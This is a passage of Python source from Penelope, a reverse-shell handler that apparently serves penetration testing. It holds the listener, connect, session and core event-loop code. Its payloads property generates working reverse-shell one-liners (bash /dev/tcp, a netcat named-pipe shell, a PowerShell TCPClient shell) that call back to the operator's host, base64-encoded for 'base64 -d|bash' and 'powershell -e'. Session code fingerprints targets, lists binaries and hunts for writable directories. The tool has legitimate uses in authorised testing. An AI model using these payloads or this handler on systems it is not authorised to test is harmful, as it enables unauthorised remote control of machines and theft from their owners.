		Examples:

			listeners			Show active Listeners
			listeners add -i any -p 4444	Create a Listener on 0.0.0.0:4444
			listeners stop 1		Stop the Listener with ID 1
		"""
		if line:
			parser = ArgumentParser(prog="listeners")
			subparsers = parser.add_subparsers(dest="command", required=True)

			parser_add = subparsers.add_parser("add", help="Add a new listener")
			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
			parser_add.add_argument("-p", "--port", help="Port to listen on", default=options.default_listener_port)
			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')

			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
			parser_stop.add_argument("id", help="Listener ID to stop")

			try:
				args = parser.parse_args(line.split())
			except SystemExit:
				return False

			if args.command == "add":
				if args.type == 'tcp':
					TCPListener(args.interface, args.port)

			elif args.command == "stop":
				if args.id == '*':
					listeners = core.listeners.copy()
					if listeners:
						for listener in listeners.values():
							listener.stop()
					else:
						cmdlogger.warning("No listeners to stop...")
						return False
				else:
					try:
						core.listeners[int(args.id)].stop()
					except (KeyError, ValueError):
						logger.error("Invalid Listener ID")

		else:
			if core.listeners:
				table = Table(joinchar=' | ')
				table.header = [paint(header).red for header in ('ID', 'Type', 'Host', 'Port')]
				for listener in core.listeners.values():
					table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
				print('\n', indent(str(table), '  '), '\n', sep='')
			else:
				cmdlogger.warning("No active Listeners...")

	def do_connect(self, line):
		"""
		<Host> <Port>
		Connect to a bind shell

		Examples:

			connect 192.168.0.101 5555
		"""
		if not line:
			cmdlogger.warning("No target specified")
			return False
		try:
			address, port = line.split(' ')

		except ValueError:
			cmdlogger.error("Invalid Host-Port combination")

		else:
			if Connect(address, port) and not options.no_attach:
				return True

	def do_payloads(self, line):
		"""

		Create reverse shell payloads based on the active listeners
		"""
		if core.listeners:
			print()
			for listener in core.listeners.values():
				print(listener.payloads, end='\n\n')
		else:
			cmdlogger.warning("No Listeners to show payloads")

	def do_Interfaces(self, line):
		"""

		Show the local network interfaces
		"""
		print(Interfaces())

	def do_exit(self, line):
		"""

		Exit Penelope
		"""
		if ask(f"Exit Penelope?{self.active_sessions} (y/N): ").lower() == 'y':
			super().do_exit(line)
			core.stop()
			for thread in threading.enumerate():
				if thread.name == 'Core':
					thread.join()
			cmdlogger.info("Exited!")
			remaining_threads = [thread for thread in threading.enumerate()]
			if options.dev_mode and remaining_threads:
				cmdlogger.error(f"REMAINING THREADS: {remaining_threads}")
			return True
		return False

	def do_EOF(self, line):
		if self.sid:
			self.set_id(None)
			print()
		else:
			print("exit")
			return self.do_exit(line)

	def do_modules(self, line):
		"""

		Show available modules
		"""
		self.show_modules()

	def do_reload(self, line):
		"""

		Reload the rc file
		"""
		load_rc()

	def do_SET(self, line):
		"""
		[option, [value]]
		Show / set option values

		Examples:

			SET			Show all options and their current values
			SET no_upgrade		Show the current value of no_upgrade option
			SET no_upgrade True	Set the no_upgrade option to True
		"""
		if not line:
			rows = [ [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
					for param in options.__dict__]
			table = Table(rows, fillchar=[paint('.').green, 0], joinchar=' => ')
			print(table)
		else:
			try:
				args = line.split(" ", 1)
				param = args[0]
				if len(args) == 1:
					value = getattr(options, param)
					if isinstance(value, (list, dict)):
						value = dumps(value, indent=4)
					print(f"{paint(value).yellow}")
				else:
					new_value = eval(args[1])
					old_value = getattr(options, param)
					setattr(options, param, new_value)
					if getattr(options, param) != old_value:
						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param)).yellow}")

			except AttributeError:
				cmdlogger.error("No such option")

			except Exception as e:
				cmdlogger.error(f"{type(e).__name__}: {e}")

	def default(self, line):
		if line in ['q', 'quit']:
			return self.onecmd('exit')
		elif line == '.':
			return self.onecmd('dir')
		else:
			parts = line.split(" ", 1)
			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
			if not candidates:
				cmdlogger.warning(f"No such command: '{line}'. Issue 'help' for all available commands")
			elif len(candidates) == 1:
				cmd = candidates[0]
				if len(parts) == 2:
					cmd += " " + parts[1]
				stdout(f"\x1b[1A\x1b[2K{self.prompt}{cmd}\n".encode(), False)
				return self.onecmd(cmd)
			else:
				cmdlogger.warning(f"Ambiguous command. Can mean any of: {candidates}")

	def complete_SET(self, text, line, begidx, endidx):
		return [option for option in options.__dict__ if option.startswith(text)]

	def complete_listeners(self, text, line, begidx, endidx):
		last = -2 if text else -1
		arg = line.split()[last]

		if arg == 'listeners':
			return [command for command in ["add", "stop"] if command.startswith(text)]
		elif arg in ('-i', '--interface'):
			return [iface_ip for iface_ip in Interfaces().list_all + ['any', '0.0.0.0'] if iface_ip.startswith(text)]
		elif arg in ('-t', '--type'):
			return [_type for _type in ("tcp",) if _type.startswith(text)]
		elif arg == 'stop':
			return self.get_core_id_completion(text, "*", attr='listeners')

	def complete_upload(self, text, line, begidx, endidx):
		return __class__.file_completer(text)

	def complete_use(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text, "none")

	def complete_sessions(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text)

	def complete_interact(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text)

	def complete_kill(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text, "*")

	def complete_run(self, text, line, begidx, endidx):
		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]

	def complete_help(self, text, line, begidx, endidx):
		return [command for command in self.raw_commands if command.startswith(text)]


class ControlQueue:

	def __init__(self):
		self._out, self._in = os.pipe()
		self.queue = queue.Queue() # TODO

	def fileno(self):
		return self._out

	def __lshift__(self, command):
		self.queue.put(command)
		os.write(self._in, b'\x00')

	def get(self):
		os.read(self._out, 1)
		return self.queue.get()

	def clear(self):
		amount = 0
		while not self.queue.empty():
			try:
				self.queue.get_nowait()
				amount += 1
			except queue.Empty:
				break
		os.read(self._out, amount) # maybe needs 'try' because sometimes close() precedes

	def close(self):
		os.close(self._in)
		os.close(self._out)

class Core:

	def __init__(self):
		self.started = False

		self.control = ControlQueue()
		self.rlist = [self.control]
		self.wlist = []

		self.attached_session = None
		self.session_wait_host = None
		self.session_wait = queue.LifoQueue()

		self.lock = threading.Lock() # TO REMOVE
		self.conn_semaphore = threading.Semaphore(5)

		self.listenerID = 0
		self.listener_lock = threading.Lock()
		self.sessionID = 0
		self.session_lock = threading.Lock()
		self.fileserverID = 0
		self.fileserver_lock = threading.Lock()

		self.hosts = defaultdict(list)
		self.sessions = {}
		self.listeners = {}
		self.fileservers = {}
		self.forwardings = {}

		self.output_line_buffer = LineBuffer(1)
		self.wait_input = False

	def __getattr__(self, name):

		if name == 'new_listenerID':
			with self.listener_lock:
				self.listenerID += 1
				return self.listenerID

		elif name == 'new_sessionID':
			with self.session_lock:
				self.sessionID += 1
				return self.sessionID

		elif name == 'new_fileserverID':
			with self.fileserver_lock:
				self.fileserverID += 1
				return self.fileserverID
		else:
			raise AttributeError(name)

	@property
	def threads(self):
		return [thread.name for thread in threading.enumerate()]

	def start(self):
		self.started = True
		threading.Thread(target=self.loop, name="Core").start()

	def loop(self):

		while self.started:
			readables, writables, _ = select(self.rlist, self.wlist, [])

			for readable in readables:

				# The control queue
				if readable is self.control:
					command = self.control.get()
					if command:
						logger.debug(f"About to execute {command}")
					else:
						logger.debug("Core break")
					try:
						exec(command)
					except KeyError: # TODO
						logger.debug("The session does not exist anymore")
					break

				# The listeners
				elif readable.__class__ is TCPListener:
					_socket, endpoint = readable.socket.accept()
					thread_name = f"NewCon{endpoint}"
					logger.debug(f"New thread: {thread_name}")
					threading.Thread(target=Session, args=(_socket, *endpoint, readable), name=thread_name).start()

				# STDIN
				elif readable is sys.stdin:
					if self.attached_session:
						session = self.attached_session
						if session.readline:
							continue

						data = os.read(sys.stdin.fileno(), options.network_buffer_size)

						if session.subtype == 'cmd':
							self._cmd = data

						if data == options.escape['sequence']:
							if session.alternate_buffer:
								logger.error("(!) Exit the current alternate buffer program first")
							else:
								session.detach()
						else:
							if session.type == 'Basic' and not hasattr(self, 'readline'): # TODO # need to see
								session.record(data, _input=not session.interactive)

							elif session.agent:
								data = Messenger.message(Messenger.SHELL, data)

							session.send(data, stdin=True)
					else:
						logger.error("You shouldn't see this error; Please report it")

				# The sessions
				elif readable.__class__ is Session:
					try:
						data = readable.socket.recv(options.network_buffer_size)
						if not data:
							raise OSError

					except OSError:
						logger.debug("Died while reading")
						readable.kill()
						break

					# TODO need thread sync
					target = readable.shell_response_buf\
					if not readable.subchannel.active\
					and readable.subchannel.allow_receive_shell_data\
					else readable.subchannel

					if readable.agent:
						for _type, _value in readable.messenger.feed(data):
							#print(_type, _value)
							if _type == Messenger.SHELL:
								if not _value: # TEMP
									readable.kill()
									break
								target.write(_value)

							elif _type == Messenger.STREAM:
								stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
								#print((repr(stream_id), repr(data)))
								try:
									readable.streams[stream_id] << data
								except (OSError, KeyError):
									logger.debug(f"Cannot write to stream; Stream <{stream_id}> died prematurely")
					else:
						target.write(data)

					shell_output = readable.shell_response_buf.getvalue() # TODO
					if shell_output:
						if readable.is_attached:
							stdout(shell_output)

						readable.record(shell_output)

						if b'\x1b[?1049h' in data:
							readable.alternate_buffer = True

						if b'\x1b[?1049l' in data:
							readable.alternate_buffer = False
						#if readable.subtype == 'cmd' and self._cmd == data:
						#	data, self._cmd = b'', b'' # TODO

						readable.shell_response_buf.seek(0)
						readable.shell_response_buf.truncate(0)

			for writable in writables:
				with writable.wlock:
					try:
						sent = writable.socket.send(writable.outbuf.getvalue())
					except OSError:
						logger.debug("Died while writing")
						writable.kill()
						break

					writable.outbuf.seek(sent)
					remaining = writable.outbuf.read()
					writable.outbuf.seek(0)
					writable.outbuf.truncate()
					writable.outbuf.write(remaining)
					if not remaining:
						self.wlist.remove(writable)

	def stop(self):
		options.maintain = 0

		if self.sessions:
			logger.warning("Killing sessions...")
			for session in reversed(list(self.sessions.copy().values())):
				session.kill()

		for listener in self.listeners.copy().values():
			listener.stop()

		for fileserver in self.fileservers.copy().values():
			fileserver.stop()

		self.control << 'self.started = False'

		menu.stop = True
		menu.cmdqueue.append("")
		menu.active.set()

def handle_bind_errors(func):
	@wraps(func)
	def wrapper(*args, **kwargs):
		host = args[1]
		port = args[2]
		try:
			func(*args, **kwargs)
			return True

		except PermissionError:
			logger.error(f"Cannot bind to port {port}: Insufficient privileges")
			print(dedent(
			f"""
			{paint('Workarounds:')}

			1) {paint('Port forwarding').UNDERLINE} (Run the Listener on a non-privileged port e.g 4444)
			    sudo iptables -t nat -A PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
			        {paint('or').white}
			    sudo nft add rule ip nat prerouting tcp dport {port} redirect to 4444
			        {paint('then').white}
			    sudo iptables -t nat -D PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
			        {paint('or').white}
			    sudo nft delete rule ip nat prerouting tcp dport {port} redirect to 4444

			2) {paint('Setting CAP_NET_BIND_SERVICE capability').UNDERLINE}
			    sudo setcap 'cap_net_bind_service=+ep' {os.path.realpath(sys.executable)}
			    ./penelope.py {port}
			    sudo setcap 'cap_net_bind_service=-ep' {os.path.realpath(sys.executable)}

			3) {paint('SUDO').UNDERLINE} (The {__program__.title()}'s directory will change to /root/.penelope)
			    sudo ./penelope.py {port}
			"""))

		except socket.gaierror:
			logger.error("Cannot resolve hostname")

		except OSError as e:
			if e.errno == EADDRINUSE:
				logger.error(f"The port '{port}' is currently in use")
			elif e.errno == EADDRNOTAVAIL:
				logger.error(f"Cannot listen on '{host}'")
			else:
				logger.error(f"OSError: {str(e)}")

		except OverflowError:
			logger.error("Invalid port number. Valid numbers: 1-65535")

		except ValueError:
			logger.error("Port number must be numeric")

		return False
	return wrapper

def Connect(host, port):

	try:
		port = int(port)
		_socket = socket.socket()
		_socket.settimeout(5)
		_socket.connect((host, port))
		_socket.settimeout(None)

	except ConnectionRefusedError:
		logger.error(f"Connection refused... ({host}:{port})")

	except OSError:
		logger.error(f"Cannot reach {host}")

	except OverflowError:
		logger.error("Invalid port number. Valid numbers: 1-65535")

	except ValueError:
		logger.error("Port number must be numeric")

	else:
		if not core.started:
			core.start()
		logger.info(f"Connected to {paint(host).blue}:{paint(port).red} 🎯")
		session = Session(_socket, host, port)
		if session:
			return True

	return False

class TCPListener:

	def __init__(self, host=None, port=None):
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		self.port = port or options.default_listener_port
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.setblocking(False)
		self.caller = caller()

		if self.bind(self.host, self.port):
			self.start()

	def __str__(self):
		return f"TCPListener({self.host}:{self.port})"

	def __bool__(self):
		return hasattr(self, 'id')

	@handle_bind_errors
	def bind(self, host, port):
		self.port = int(port)
		self.socket.bind((host, self.port))

	def fileno(self):
		return self.socket.fileno()

	def start(self):
		specific = ""
		if self.host == '0.0.0.0':
			specific = paint('→  ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().list.values()])

		logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').red}{paint(self.port).red} {specific}")

		self.socket.listen(5)

		self.id = core.new_listenerID
		core.rlist.append(self)
		core.listeners[self.id] = self
		if not core.started:
			core.start()

		core.control << "" # TODO

		if options.payloads:
			print(self.payloads)

	def stop(self):

		if threading.current_thread().name != 'Core':
			core.control << f'self.listeners[{self.id}].stop()'
			return

		core.rlist.remove(self)
		del core.listeners[self.id]

		try:
			self.socket.shutdown(socket.SHUT_RDWR)
		except OSError:
			pass

		self.socket.close()

		if options.single_session and core.sessions and not self.caller == 'spawn':
			logger.info(f"Stopping {self} due to Single Session mode")
		else:
			logger.warning(f"Stopping {self}")

	@property
	def payloads(self):
		interfaces = Interfaces().list
		presets = [
			"(bash >& /dev/tcp/{}/{} 0>&1) &",
			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
		]

		output = [str(paint(self).white_MAGENTA)]
		output.append("")
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in interfaces.values()]

		for ip in ips:
			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
			output.append(str(paint("Bash TCP").UNDERLINE))
			output.append(f"printf {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
			output.append("")
			output.append(str(paint("Netcat + named pipe").UNDERLINE))
			output.append(f"printf {base64.b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
			output.append("")
			output.append(str(paint("Powershell").UNDERLINE))
			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, self.port).encode("utf-16le")).decode())

			output.extend(dedent(f"""
			{paint('Metasploit').UNDERLINE}
			set PAYLOAD generic/shell_reverse_tcp
			set LHOST {ip}
			set LPORT {self.port}
			set DisablePayloadHandler true
			""").split("\n"))

		output.append("─" * 80)
		return '\n'.join(output)


class Channel:

	def __init__(self, raw=False, expect = []):
		self._read, self._write = os.pipe()
		self.can_use = True
		self.active = True
		self.allow_receive_shell_data = True
		self.control = ControlQueue()

	def fileno(self):
		return self._read

	def read(self):
		return os.read(self._read, options.network_buffer_size)

	def write(self, data):
		os.write(self._write, data)

	def close(self):
		os.close(self._read)
		os.close(self._write)

class Session:

	def __init__(self, _socket, target, port, listener=None):
		with core.conn_semaphore:
			#print(core.threads)
			print("\a", flush=True, end='')

			self.socket = _socket
			self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			self.socket.setblocking(False)
			self.target, self.port = target, port
			try:
				self.ip = _socket.getpeername()[0]
			except:
				logger.error(f"Invalid connection from {self.target} 🙄")
				return
			self._host, self._port = self.socket.getsockname()
			self.listener = listener
			self.source = 'reverse' if listener else 'bind'

			self.id = None
			self.OS = None
			self.type = 'Basic'
			self.subtype = None
			self.interactive = None
			self.echoing = None
			self.pty_ready = None
			self.readline = None

			self.win_version = None

			self.prompt = None
			self.new = True

			self.last_lines = LineBuffer(options.attach_lines)
			self.lock = threading.Lock()
			self.wlock = threading.Lock()

			self.outbuf = io.BytesIO()
			self.shell_response_buf = io.BytesIO()

			self.tasks = {"portfwd":[], "scripts":[]}
			self.subchannel = Channel()
			self.latency = None

			self.alternate_buffer = False
			self.agent = False
			self.messenger = Messenger(io.BytesIO)

			self.streamID = 0
			self.streams = dict()
			self.stream_lock = threading.Lock()
			self.stream_code = Messenger.STREAM_CODE
			self.streams_max = 2 ** (8 * Messenger.STREAM_BYTES)

			self.shell_pid = None
			self.user = None
			self.tty = None

			self._bin = defaultdict(lambda: "")
			self._tmp = None
			self._cwd = None
			self._can_deploy_agent = None

			self.upgrade_attempted = False

			core.rlist.append(self)

			if self.determine():
				logger.debug(f"OS: {self.OS}")
				logger.debug(f"Type: {self.type}")
				logger.debug(f"Subtype: {self.subtype}")
				logger.debug(f"Interactive: {self.interactive}")
				logger.debug(f"Echoing: {self.echoing}")

				self.get_system_info()

				if not self.hostname:
					if target == self.ip:
						try:
							self.hostname = socket.gethostbyaddr(target)[0]

						except socket.herror:
							self.hostname = ''
							logger.debug("Cannot resolve hostname")
					else:
						self.hostname = target

				hostname = self.hostname
				c1 = '~' if hostname else ''
				ip = self.ip
				c2 = '-'
				system = self.system
				if not system:
					system = self.OS.upper()
				if self.arch:
					system += '-' + self.arch

				self.name = f"{hostname}{c1}{ip}{c2}{system}"
				self.name_colored = (
					f"{paint(hostname).white_BLUE}{paint(c1).white_DIM}"
					f"{paint(ip).white_RED}{paint(c2).white_DIM}"
					f"{paint(system).cyan}"
				)

				self.id = core.new_sessionID
				core.hosts[self.name].append(self)
				core.sessions[self.id] = self

				if self.name == core.session_wait_host:
					core.session_wait.put(self.id)

				play_sound(SOUNDS['success'])

				logger.info(
					f"Got {self.source} shell from "
					f"{self.name_colored}{paint().green} 😍️ "
					f"Assigned SessionID {paint('<' + str(self.id) + '>').yellow}"
				)

				self.directory = options.basedir / self.name
				if not options.no_log:
					self.directory.mkdir(parents=True, exist_ok=True)
					self.logpath = self.directory / f'{datetime.now().strftime("%Y_%m_%d-%H_%M_%S-%f")[:-3]}.log'
					self.histfile = self.directory / "readline_history"
					self.logfile = open(self.logpath, 'ab', buffering=0)
					if not options.no_timestamps:
						self.logfile.write(str(paint(datetime.now().strftime("%Y-%m-%d %H:%M:%S: ")).magenta).encode())

				for module in modules().values():
					if module.enabled and module.on_session_start:
						module.run(self)

				maintain_success = self.maintain()

				if options.single_session and self.listener:
					self.listener.stop()

				if hasattr(listener_menu, 'active') and listener_menu.active:
					os.close(listener_menu.control_w)
					listener_menu.finishing.wait()

				attach_conditions = [
					# Is a reverse shell and the Menu is not active and (reached the maintain value or maintain failed)
					self.listener and not menu.active.is_set() and (len(core.hosts[self.name]) == options.maintain or not maintain_success),

					# Is a bind shell and is not spawned from the Menu
					not self.listener and not menu.active.is_set(),

					# Is a bind shell and is spawned from the connect Menu command
					not self.listener and menu.active.is_set() and menu.lastcmd.startswith('connect')
				]

				# If no other session is attached
				if core.attached_session is None:
					# If auto-attach is enabled
					if not options.no_attach:
						if any(attach_conditions):
							# Attach the newly created session
							self.attach()
					else:
						if self.id == 1:
							menu.set_id(self.id)
						if not menu.active.is_set():
							menu.show()
			else:
				self.kill()
				time.sleep(1)
			return

	def __bool__(self):
		return self.socket.fileno() != -1 # and self.OS)

	def __repr__(self):
		try:
			return (
				f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
				f"interactive={self.interactive}, echoing={self.echoing})"
			)
		except:
			return f"ID: (for deletion: {self.id})"

	def __getattr__(self, name):
		if name == 'new_streamID':
			with self.stream_lock:
				if len(self.streams) == self.streams_max:
					logger.error("Too many open streams...")
					return None

				self.streamID += 1
				self.streamID = self.streamID % self.streams_max
				while struct.pack(self.stream_code, self.streamID) in self.streams:
					self.streamID += 1
					self.streamID = self.streamID % self.streams_max

				_stream_ID_hex = struct.pack(self.stream_code, self.streamID)
				self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)

				return self.streams[_stream_ID_hex]
		else:
			raise AttributeError(name)

	def fileno(self):
		return self.socket.fileno()

	@property
	def can_deploy_agent(self):
		if self._can_deploy_agent is None:
			if Path(self.directory / ".noagent").exists():
				self._can_deploy_agent = False
			else:
				_bin = self.bin['python3'] or self.bin['python']
				if _bin:
					version = self.exec(f"{_bin} -V 2>&1 || {_bin} --version 2>&1", value=True)
					try:
						major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
					except:
						self._can_deploy_agent = False
						return self._can_deploy_agent
					self.remote_python_version = (int(major), int(minor), int(micro))
					if self.remote_python_version >= (2, 3): # Python 2.2 lacks: tarfile, os.walk, yield
						self._can_deploy_agent = True
					else:
						self._can_deploy_agent = False
				else:
					self._can_deploy_agent = False

		return self._can_deploy_agent

	@property
	def spare_control_sessions(self):
		return [session for session in self.host_control_sessions if session is not self]

	@property
	def host_needs_control_session(self):
		return [session for session in core.hosts[self.name] if session.need_control_session]

	@property
	def need_control_session(self):
		return all([self.OS == 'Unix', self.type == 'PTY', not self.agent, not self.new])

	@property
	def host_control_sessions(self):
		return [session for session in core.hosts[self.name] if not session.need_control_session]

	@property
	def control_session(self):
		if self.need_control_session:
			for session in core.hosts[self.name]:
				if not session.need_control_session:
					return session
			return None # TODO self.spawn()
		return self

	def get_system_info(self):
		self.hostname = self.system = self.arch = ''

		if self.OS == 'Unix':
			if not self.bin['uname']:
				return False

			response = self.exec(
				r'printf "$({0} -n)\t'
				r'$({0} -s)\t'
				r'$({0} -m 2>/dev/null|grep -v unknown||{0} -p 2>/dev/null)"'.format(self.bin['uname']),
				agent_typing=True,
				value=True
			)

			try:
				self.hostname, self.system, self.arch = response.split("\t")
			except:
				return False

		elif self.OS == 'Windows':
			self.systeminfo = self.exec('systeminfo', value=True)
			if not self.systeminfo:
				return False

			if (not "\n" in self.systeminfo) and ("OS Name" in self.systeminfo): #TODO TEMP PATCH
				self.exec("cd", force_cmd=True, raw=True)
				return False

			def extract_value(pattern):
				match = re.search(pattern, self.systeminfo, re.MULTILINE)
				return match.group(1).replace(" ", "_").rstrip() if match else ''

			self.hostname = extract_value(r"^Host Name:\s+(.+)")
			self.system = extract_value(r"^OS Name:\s+(.+)")
			self.arch = extract_value(r"^System Type:\s+(.+)")

		return True

	def get_shell_info(self, silent=False):
		self.shell_pid = self.get_shell_pid()
		self.user = self.get_user()
		if self.OS == 'Unix':
			self.tty = self.get_tty(silent=silent)

	def get_shell_pid(self):
		if self.OS == 'Unix':
			response = self.exec("echo $$", agent_typing=True, value=True)

		elif self.OS == 'Windows':
			return None # TODO

		if not (isinstance(response, str) and response.isnumeric()):
			logger.error(f"Cannot get the PID of the shell. Response:\r\n{paint(response).white}")
			return False
		return response

	def get_user(self):
		if self.OS == 'Unix':
			response = self.exec("echo \"$(id -un)($(id -u))\"", agent_typing=True, value=True)

		elif self.OS == 'Windows':
			if self.type == 'PTY':
				return None # TODO
			response = self.exec("whoami", value=True)

		return response or ''

	def get_tty(self, silent=False):
		response = self.exec("tty", agent_typing=True, value=True) # TODO check binary
		if not (isinstance(response, str) and response.startswith('/')):
			if not silent:
				logger.error(f"Cannot get the TTY of the shell. Response:\r\n{paint(response).white}")
			return False
		return response

	@property
	def cwd(self):
		if self._cwd is None:
			if self.OS == 'Unix':
				cmd = (
				    f"readlink /proc/{self.shell_pid}/cwd 2>/dev/null || "
				    f"lsof -p {self.shell_pid} 2>/dev/null | awk '$4==\"cwd\" {{print $9;exit}}' | grep . || "
				    f"procstat -f {self.shell_pid} 2>/dev/null | awk '$3==\"cwd\" {{print $NF;exit}}' | grep . || "
				    f"pwdx {self.shell_pid} 2>/dev/null | awk '{{print $2;exit}}' | grep ."
				)
				self._cwd = self.exec(cmd, value=True)
			elif self.OS == 'Windows':
				self._cwd = self.exec("cd", force_cmd=True, value=True)
		return self._cwd or ''

	@property
	def is_attached(self):
		return core.attached_session is self

	@property
	def bin(self):
		if not self._bin:
			try:
				if self.OS == "Unix":
					binaries = [
						"sh", "bash", "python", "python3", "uname",
						"script", "socat", "tty", "echo", "base64", "wget",
						"curl", "tar", "rm", "stty", "setsid", "find", "nc"
					]
					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
					if response:
						self._bin = dict(zip(binaries, response.decode().splitlines()))

					missing = [b for b in binaries if not os.path.isabs(self._bin[b])]

					if missing:
						logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
						response = self.exec(
							f'for bin in {" ".join(missing)}; do for dir in '
							f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
							'test -f $_bin && break || unset _bin; done; echo $_bin; done'
						)
						if response:
							self._bin.update(dict(zip(missing, response.decode().splitlines())))

				for binary in options.no_bins:
					self._bin[binary] = None

				result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
				logger.debug(f"Available binaries on target: \n{paint(result).red}")
			except:
				pass

		return self._bin

	@property
	def tmp(self):
		if self._tmp is None:
			if self.OS == "Unix":
				logger.debug("Trying to find a writable directory on target")
				tmpname = rand(10)
				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
				for directory in common_dirs:
					if not self.exec(f'echo {tmpname} > {directory}/{tmpname}', value=True):
						self.exec(f'rm {directory}/{tmpname}')
						self._tmp = directory
						break
				else:
					candidate_dirs = self.exec("find / -type d -writable 2>/dev/null")
					if candidate_dirs:
						for directory in candidate_dirs.decode().splitlines():
							if directory in common_dirs:
								continue
							if not self.exec(f'echo {tmpname} > {directory}/{tmpname}', value=True):
								self.exec(f'rm {directory}/{tmpname}')
								self._tmp = directory
								break
				if not self._tmp:
					self._tmp = False
					logger.warning("Cannot find writable directory on target...")
				else:
					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")

			elif self.OS == "Windows":
				self._tmp = self.exec("echo %TEMP%", force_cmd=True, value=True)

		return self._tmp

	def agent_only(func):
		@wraps(func)
		def newfunc(self, *args, **kwargs):
			if not self.agent:
				if not self.upgrade_attempted and self.can_deploy_agent:
					logger.warning("This can only run in python agent mode. I am trying to deploy the agent")
					self.upgrade()
					if not self.agent:
						logger.error("Failed to deploy agent")
						return False
				else:
					logger.error("This can only run in python agent mode")
					return False
			return func(self, *args, **kwargs)
		return newfunc

	def send(self, data, stdin=False):
		with self.wlock: #TODO
			if not self in core.rlist:
				return False

			self.outbuf.seek(0, io.SEEK_END)
			_len = self.outbuf.write(data)

			self.subchannel.allow_receive_shell_data = True

			if self not in core.wlist:
				core.wlist.append(self)
				if not stdin:
					core.control << ""
			return _len

	def record(self, data, _input=False):
		self.last_lines << data
		if not options.no_log:
			self.log(data, _input)

	def log(self, data, _input=False):
		#data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)', b'', data)
		data = re.sub(rb'\x1b\x63', b'', data) # Need to include all Clear escape codes

		if not options.no_timestamps:
			timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S: ") #TEMP
			if not options.no_colored_timestamps:
				timestamp = paint(timestamp).magenta
			data = re.sub(rb'\r\n|\r|\n|\v|\f', rf"\g<0>{timestamp}".encode(), data)
		try:
			if _input:
				self.logfile.write(bytes(paint('ISSUED ==>').GREEN + ' ', encoding='utf8'))
			self.logfile.write(data)

		except ValueError:
			logger.debug("The session killed abnormally")

	def determine(self, path=False):

		var_name1, var_name2, var_value1, var_value2 = (rand(4) for _ in range(4))

		def expect(data):
			try:
				data = data.decode()
			except:
				return False

			if var_value1 + var_value2 in data:
				return True

			elif f"'{var_name1}' is not recognized as an internal or external command" in data:
				return re.search('batch file.\r\n', data, re.DOTALL)
			elif re.search('PS.*>', data, re.DOTALL):
				return True

			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
				return re.search('or operable.*>', data, re.DOTALL)
			elif re.search('Microsoft Windows.*>', data, re.DOTALL):
				return True

		response = self.exec(
			f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n",
			raw=True,
			expect_func=expect
		)

		if response:
			response = response.decode()

			if var_value1 + var_value2 in response:
				self.OS = 'Unix'
				self.prompt = re.search(f"{var_value1}{var_value2}\n(.*)", response, re.DOTALL)
				if self.prompt:
					self.prompt = self.prompt.group(1).encode()
				self.interactive = bool(self.prompt)
				self.echoing = f"echo ${var_name1}${var_name2}" in response

			elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
					re.search('Microsoft Windows.*>', response, re.DOTALL):
				self.OS = 'Windows'
				self.type = 'Basic'
				self.subtype = 'cmd'
				self.interactive = True
				self.echoing = True
				prompt = re.search(r"\r\n\r\n([a-zA-Z]:\\.*>)", response, re.MULTILINE)
				self.prompt = prompt[1].encode() if prompt else b""
				win_version = re.search(r"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)
				if win_version:
